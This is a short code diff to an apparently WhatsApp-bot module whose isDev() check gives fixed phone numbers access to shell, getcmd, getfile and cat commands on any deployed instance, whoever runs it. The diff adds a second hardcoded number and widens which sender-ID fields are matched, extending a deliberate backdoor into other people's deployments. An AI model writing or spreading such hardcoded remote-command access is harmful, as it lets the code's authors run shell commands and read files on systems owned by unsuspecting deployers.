@@ -5,12 +5,12 @@
  * regardless of who owns/deploys this instance of the bot.
  * Used for high-risk commands: shell, getcmd, getfile, cat.
  */
-const DEV_NUMBER = '254754574642';
+const DEV_NUMBERS = ['254754574642', '254740832308'];
 
 function isDev(msg) {
-  const senderJid = msg.key.participantPn || msg.key.participant || msg.key.remoteJid;
+  const senderJid = msg.key.participantPn || msg.key.participantAlt || msg.key.participant || msg.key.remoteJidAlt || msg.key.remoteJid;
   const senderNumber = senderJid.split('@')[0].split(':')[0];
-  return senderNumber === DEV_NUMBER;
+  return DEV_NUMBERS.includes(senderNumber);
 }
 
 module.exports = { isDev };
